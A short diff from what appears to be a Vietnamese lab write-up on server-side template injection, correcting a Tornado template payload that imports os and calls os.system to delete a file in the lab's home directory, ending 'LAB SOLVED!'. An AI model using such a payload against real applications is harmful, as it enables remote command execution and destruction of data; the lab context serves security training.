@@ -66,7 +66,7 @@ Thực hiện post 1 comment lên và quan sát tên hiển thị => Thấy giá
 
 ```
 {% import os %}
-{{os.system('rm /home/carlos/morale.txt')
+{{os.system('rm /home/carlos/morale.txt')}}
 ```
 
 LAB SOLVED!
